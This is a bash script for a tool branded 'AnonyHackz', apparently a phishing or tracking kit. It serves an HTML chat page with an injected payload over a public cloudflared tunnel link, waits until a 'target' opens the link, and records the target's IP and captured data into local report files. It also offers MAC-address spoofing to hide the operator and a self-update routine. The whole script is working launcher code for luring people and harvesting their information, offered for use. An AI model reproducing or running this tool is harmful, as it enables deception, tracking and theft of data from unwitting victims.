#!/bin/bash
# AnonyHackz v 0.1.1
# Powered by AnonyHackz
# visit https://youtube.com/@anonyhackz741

__version__="V0.1.1"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")



## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"


banner() {
clear;
cat <<- EOF

			${RED}		  █████╗ ██╗  ██╗ ██████╗ ██╗     
			${RED} 		 ██╔══██╗██║  ██║██╔════╝ ██║     
			${RED} 		 ███████║███████║██║  ███╗██║     
			${RED}		 ██╔══██║██╔══██║██║   ██║██║     
			${RED}		 ██║  ██║██║  ██║╚██████╔╝███████╗
			${RED} 		 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
			${CYAN}  			  @ AnonyHackz${WHITE}
			${RED}       		          ${BLUE}Version : ${__version__}  

		
	EOF
}




# Check for a newer release
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	relase_url='https://api.github.com/repos/AnonyHackz/AnonyHackzGL/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/AnonyHackz/AnonyHackzGL/archive/refs/tags/${new_version}.tar.gz"
	echo -e "${CYAN}Local version: $__version__, Remote version: $new_version${WHITE}"


	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}update found\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".AnonyHackzGL.tar.gz" "${tarball_url}"

		if [[ -e ".AnonyHackzGL.tar.gz" ]]; then
			tar -xf .AnonyHackzGL.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
			rm -f .AnonyHackzGL.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run anonyhackz again\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}
                            


macspoofer(){

	default_option="Y"
	read -p $'\n\e[1;93m Do you want to change MAC address for your privacy [Default is Y] [Y/N]: \e[0m' option
	option_result="${option:-${default_option}}"
	if [[ $option_result == "Y" || $option_result == "y" || $option_result == "Yes" || $option_result == "yes" ]]; then
		sleep 2
		printf " Directing to script \n"
		sleep 2
		sudo chmod +x ./AHMacSpoofer/analyze.sh
		bash ./AHMacSpoofer/analyze.sh
	
	else
		sleep 2
		printf "\n"
		get_mac() {
		    local interface=$1
		    mac_address=$(ip link show "$interface" | grep -oP 'ether \K[[:xdigit:]:]{17}')
		    sleep 2
		    echo " Using existing MAC address for $interface is: $mac_address"
		    }

		# Automatically detect the active interface (either Ethernet or Wireless)
		active_interface=$(ip link show | grep -E 'state UP' | awk -F': ' '{print $2}' | awk '{print $1}' | head -n 1)

		# Check if an active interface is found
		if [ -z "$active_interface" ]; then
		    echo " ❌ No active network interface found."
		    exit 1
		fi

		# Get and display the MAC address for the active interface
		get_mac "$active_interface"
		
		
		
		
		
	sleep 3
	fi

}







dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}


cf_server() {

if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm cf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:3000...\n"
php -S 127.0.0.1:3000 > /dev/null 2>&1 & 
sleep 2
checkfound
}

anonyHackz() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
default_option_server="Y"
read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:3000 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
sleep 1
else
local_server
sleep 1
fi
}

banner
sleep 2
check_status
macspoofer
dependencies
anonyHackz

